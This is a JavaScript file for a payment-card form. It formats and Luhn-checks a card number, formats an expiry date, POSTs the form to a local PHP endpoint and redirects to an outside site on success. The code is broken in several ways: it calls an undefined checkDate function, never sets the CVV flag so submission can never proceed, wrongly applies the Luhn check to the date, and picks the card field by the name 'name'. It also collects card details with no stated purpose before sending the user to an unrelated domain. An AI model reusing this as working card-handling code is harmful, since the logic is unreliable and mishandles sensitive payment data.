(function () {
    function sendFormDataXMLHttp(form) {
        let request = new XMLHttpRequest();
        request.open('POST', '/form/send.php', true)
        request.setRequestHeader('accept', 'application/json');

        form.addEventListener('submit', function (event) {
            event.preventDefault();
            if (validNumber && validCVV && validDate) {
                let formData = new FormData(form);

                request.send(formData);

                request.onreadystatechange = function () {
                    if (request.readyState < 4)
                        console.log('Ответ от сервера полностью загружен')
                    else if (request.readyState === 4) {
                        if (request.status === 200 && request.status < 300) {
                            console.log('200 - 299 = успешная отправка данных!')
                            window.location.href = `http://misha.amemory.pro/`;
                        } else {
                            console.log('что-то пошло не так')
                        }
                    }
                }
            } else {
                console.log('fail')
            }
        });
    }

    function luhnAlgorithm(digits) {
        let sum = 0;

        for (let i = 0; i < digits.length; i++) {
            let cardNum = parseInt(digits[i]);

            if ((digits.length - i) % 2 === 0) {
                cardNum = cardNum * 2;

                if (cardNum > 9) {
                    cardNum = cardNum - 9;
                }
            }

            sum += cardNum;
        }

        return sum % 10 === 0;
    }

    function onlyNumber(input) {
        input.value = input.value.replace(/[^\d]/g, '');
    }





    let validNumber = false;
    let validDate = false;
    let validCVV = false;
    const forms = document.querySelectorAll('form')

    console.log(checkDate(2000, 11));

    if (forms.length) {
        for (let i = 0; i < forms.length; i++) {
            let label = forms[i].querySelectorAll('label')

            for (let i = 0; i < label.length; i++) {
                const errorMsg = label[i].querySelector('.error')
                const input = label[i].querySelector('input')
                if (input) {
                    input.addEventListener('invalid', function (event) {
                        event.preventDefault();
                        if (!event.target.validity.valid) {
                            errorMsg.style.opacity = '1';
                            setTimeout(function () {
                                errorMsg.style.opacity = '0';
                            }, 3000)
                        } else {
                            errorMsg.style.opacity = '0';
                        }
                    })
                }
                if (input.name === 'name') {
                    input.addEventListener('keyup', (e) => {
                        onlyNumber(input)

                        let value = input.value.split(" ").join("");
                        if (value.length > 0) {
                            value = value.match(new RegExp('.{1,4}', 'g')).join(" ");
                        }
                        input.value = value
                        validNumber = luhnAlgorithm(input.value.replace(/\s/g, ''))
                    })
                }
                if (input.name === 'cardDate') {
                    input.addEventListener('keyup', (e) => {
                        onlyNumber(input);
                        let value = input.value.split(" ").join("");
                        if (value.length > 0) {
                            value = value.match(new RegExp('.{1,2}', 'g')).join("/");
                        }
                        input.value = value

                        validDate = luhnAlgorithm(input.value.replace(/\s/g, ''))
                    })
                }
            }
            sendFormDataXMLHttp(forms[i])

        }
    }
}());
